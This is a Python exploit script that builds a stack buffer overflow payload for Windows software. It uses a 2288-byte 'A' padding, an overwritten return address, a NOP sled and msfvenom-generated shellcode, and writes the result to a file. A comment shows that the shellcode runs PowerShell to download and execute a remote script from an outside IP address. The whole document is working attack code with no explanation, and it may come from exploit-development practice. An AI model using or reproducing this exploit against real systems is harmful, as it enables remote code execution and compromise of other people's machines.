#!/usr/bin/python3

#msfvenom -a x86 -p windows/exec CMD="powershell \"iex(New-Object Net.WebClient).DownloadString('http://192.0.0.7/IP.ps1')\"" --smallest -b "\x00" -f python

buf =  b""
buf += b"\x2b\xc9\x66\xb9\x0c\x01\xe8\xff\xff\xff\xff\xc1\x5e"
buf += b"\x30\x4c\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05\x06\x67"
buf += b"\x81\xec\x3b\xcb\x68\x86\x5e\x3f\x9b\x43\x1e\x98\x46"
buf += b"\x01\x9d\x65\x30\x16\xad\x51\x3a\x2c\xe1\xb3\x1c\x40"
buf += b"\x5e\x21\x08\x05\xe7\xe8\x25\x28\xed\xc9\xde\x7f\x79"
buf += b"\xa4\x62\x21\xb9\x79\x08\xbe\x7a\x26\x40\xda\x72\x3a"
buf += b"\xed\x6c\xb5\x66\x60\x40\x91\xc8\x0d\x5d\xa5\x7d\x01"
buf += b"\xc2\x7e\xc0\x4d\x9b\x7f\xb0\xfc\x90\x9d\x5e\x55\x92"
buf += b"\x6e\xb7\x2d\xaf\x59\x26\xa4\x66\x23\x7b\x15\x85\x3a"
buf += b"\xe8\x3c\x41\x67\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e"
buf += b"\xa3\xfa\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d"
buf += b"\x24\x24\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4"
buf += b"\xe0\x8a\x01\x08\x3c\x8f\x90\x91\xc2\xfb\xa5\x1e\xf9"
buf += b"\x10\x67\x4c\x21\x6b\x29\x3f\xc8\xf7\x06\x34\x1f\x3e"
buf += b"\x5b\x70\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14\xf7"
buf += b"\xa2\xc0\xdc\xde\xb5\xe5\x48\x6d\xc9\xd5\xcc\xd9\xcf"
buf += b"\xcd\xd7\xa5\xad\xae\xe3\xe6\xac\xa3\xbf\xe0\x87\xaf"
buf += b"\xbc\xe1\x82\xac\xa5\xb5\xb2\xa6\xf3\x9a\xb0\xa2\xf9"
buf += b"\x8f\xbc\xb8\x98\xb0\xb4\xbb\xb1\x94\xc8\xcc\xa7\x8b"
buf += b"\x92\x88\x8b\x87\x88\x8e\xb8\x98\x9f\x87\x81\x97\xd9"
buf += b"\xd5\x9b\x80\x81\x86\xcd\xd7\xd6\xcb\xc2\xce\xd3\xce"
buf += b"\xd1\x30\x2f\x35\x2c\x4d\x55\x28\x77\x7b\x38\x2d\x22"
buf += b"\x2e\x0d"

offset = 2288
overflow = b"A" * offset
#148010CF
retn = b"\xcf\x10\x80\x14"

buffer = overflow + retn + b"\x90" * 30 + buf

print(type(buffer))
payload = buffer
try:
	f=open("final_payload.txt","wb")
	print("[+] Creating %s bytes payload.." %len(payload))
	f.write(buffer)
	f.close()
	print("[+] File created!")
except:
	print("File cannot be created")
